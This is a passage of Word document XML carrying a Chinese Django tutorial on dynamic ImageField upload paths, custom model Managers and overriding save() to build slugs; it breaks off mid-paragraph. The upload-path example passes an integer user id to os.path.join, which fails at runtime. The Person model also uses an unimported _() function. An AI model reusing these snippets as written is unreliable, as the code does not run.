    <w:p w14:paraId="2DA0343A" w14:textId="1215C0C1" w:rsidR="003802BB" w:rsidRPr="00995934" w:rsidRDefault="003802BB" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="76004F49" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="00995934" w:rsidRDefault="003802BB" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Django模型中的ImageField和FileField的upload_to选项是必填项，其存储路径是相对于MEIDA_ROOT而来的。然而我们可能希望动态定义上传路径，比如把文件上传到每个用户名下的文件夹里，并对上传文件重命名，这时我们可以定义一个user_directory_path方法。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4058864B" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django.db import models</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="618FA451" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django.contrib.auth.models import User</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CD95541" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>import uuid</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E0B7AE3" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>import os</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46AC2C0F" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1B398674" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t># Create your models here.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40A3FAEA" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6B5B4844" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>def user_directory_path(instance, filename):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46E0B872" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    ext = filename.split('.')[-1]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F0BDF84" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    filename = '{}.{}'.format(uuid.uuid4().hex[:10], ext)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7173C1D7" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">    # return the whole path to the file</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="371641F7" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    return os.path.join(instance.user.id, "avatar", filename)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E874712" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="78404592" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>class UserProfile(models.Model):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D807B67" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    user = models.OneToOneField(User, on_delete=models.CASCADE, related_name='profile')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="577A21E2" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    avatar = models.ImageField(upload_to=user_directory_path, verbose_name="</w:t>
      </w:r>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>头像</w:t>
      </w:r>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04EEA8E5" w14:textId="450B243D" w:rsidR="003802BB" w:rsidRPr="00995934" w:rsidRDefault="003802BB" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52D218F4" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="00995934" w:rsidRDefault="003802BB" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="61143895" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="00995934" w:rsidRDefault="003802BB" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Django模型的Manager方法值得一看</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64465FB1" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5FCB9434" w14:textId="0372C042" w:rsidR="003802BB" w:rsidRPr="00995934" w:rsidRDefault="003802BB" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="20017432" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="00995934" w:rsidRDefault="003802BB" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Django模型自带models.Manager方法，可以简化我们的代码。如下面案例中，我们可以使用Person.objects.all()查询到所有人，而Person.authors.all和Person.editors.all()只返回所authors和editors。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="656D5AEC" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>class AuthorManager(models.Manager):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C90CADD" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    def get_queryset(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="633AB3C4" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        return super().get_queryset().filter(role='A')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BB6A50C" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3E803104" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>class EditorManager(models.Manager):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3081F5B8" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    def get_queryset(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4745183C" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        return super().get_queryset().filter(role='E')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10F32682" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6BB6F3A0" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>class Person(models.Model):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6320A2BF" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    first_name = models.CharField(max_length=50)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F241DE6" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    last_name = models.CharField(max_length=50)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1463406B" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    role = models.CharField(max_length=1, choices=(('A', _('Author')), ('E', _('Editor'))))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4400ED14" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    objects = models.Manager()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EBEFE5F" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    authors = AuthorManager()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72D36BD1" w14:textId="7293E4D7" w:rsidR="003802BB" w:rsidRPr="00995934" w:rsidRDefault="003802BB" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    editors = EditorManager()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33DC1FF8" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="00995934" w:rsidRDefault="003802BB" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1EC34E6E" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="00995934" w:rsidRDefault="003802BB" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Django模型的save方法重写</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45A48390" w14:textId="70315C7F" w:rsidR="003802BB" w:rsidRPr="00995934" w:rsidRDefault="003802BB" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="53580E97" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="00995934" w:rsidRDefault="003802BB" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>在很多应用场景中我们需要重写django模型的save方法，比如本例中我们希望根据title生成slug，并在一个对象数据save完成后做其它事情（比如发送邮件或发送信号），我们可以按如下代码重写django模型的save方法，非常容易。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7410F9C3" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django.template.defaultfilters import slugify</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AD91237" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="64E24A86" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>class Article(models.Model):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58C44CF1" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    ...</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12161D27" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="59E55FA6" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    def save(self, *args, **kwargs):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6069716B" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        if not self.slug or not self.id:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D0375C5" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            self.slug = slugify(self.title)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DA28D4A" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        super().save(*args, **kwargs)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A2EB023" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7434AA8B" w14:textId="40132993" w:rsidR="003802BB" w:rsidRPr="00995934" w:rsidRDefault="003802BB" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
